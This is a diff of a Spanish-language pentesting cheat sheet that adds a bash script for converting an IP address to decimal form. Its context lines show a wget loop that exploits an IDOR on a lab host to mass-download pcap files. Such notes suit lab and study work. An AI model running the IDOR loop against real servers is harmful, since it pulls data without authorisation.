@@ -94,3 +94,33 @@ Script que aprovecha un idor para descargar de forma masiva en modo **oneliner**
 ```bash
 for i in {0..500} ; do wget http://10.10.10.245/download/${i} -O pcaps/${i}.pcap 2>/dev/null || break; done; rm pcaps/${i}.pcap
 ```
+
+# Pasar IP a decimal
+
+```bash
+#!/bin/bash
+
+ip_to_decimal() {
+  IFS='.' read -r -a octetos <<< "$1"
+  decimal=0
+  for ((i=0; i<4; i++)); do
+    octeto=${octetos[i]}
+    decimal=$((decimal*256 + octeto))
+  done
+  echo "$decimal"
+}
+
+read -p "Ingresa la dirección IP: " ipv4
+decimal=$(ip_to_decimal "$ipv4")
+echo "La IP $ipv4 en formato decimal es: $decimal"
+```
+
+Uso el script para pasar de dirección **IP** a decimal `ip2dec.sh`.
+
+```txt
+❯ ./ip2dec.sh
+Ingresa la dirección IP: 192.168.1.1
+La IP 192.168.1.1 en formato decimal es: 3232235777
+```
+
+Introduzco la dirección **IP** en formato decimal y me muestra lo siguiente.
